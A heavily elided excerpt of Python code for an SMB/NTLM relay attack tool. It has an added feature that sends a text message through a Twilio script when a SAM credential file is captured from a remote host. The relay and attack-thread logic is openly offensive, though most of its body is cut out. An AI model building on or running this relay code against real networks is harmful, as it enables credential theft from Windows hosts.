...
class doAttack(Thread):
    def __init__(self, SMBClient, exeFile, command, phone):
        ...
        if self.__exeFile is not None:
            ...
            try:
                if self.__command is not None:
                    ...
                    # leon added alert script
                    message = "Captured SAM file from %s" % self.__SMBConnection.getRemoteHost()
                    if self.__phone is not None:
                        command = 'python ./textmetwilio.py %s -m "%s"' % (self.__phone, message)
                        try:
        ...
        def do_GET(self):
            ...
            if messageType == 1:
                ...
                if errorCode != STATUS_SUCCESS:
                    ...
                    clientThread = doAttack(self.client,self.server.exeFile,self.server.command,self.server.phone)
                    clientThread.start()
        ...
        if connData['_dialects_parameters']['Capabilities'] & SMB.CAP_EXTENDED_SECURITY:
            ...
            if messageType == 0x01:
                ...
                if errorCode != STATUS_SUCCESS:
                    ...
                    # If the attack fails, the doAttack thread will be responsible of removing it from the set
                    ATTACKED_HOSTS.add(self.target)
                    clientThread = doAttack(smbClient,self.exeFile,self.command,self.phone)
                    clientThread.start()
...
if __name__ == '__main__':
    ...
    parser.add_argument('-p', metavar='Phone', action="store", help='Phone number to send text to when smbrelay is successful')
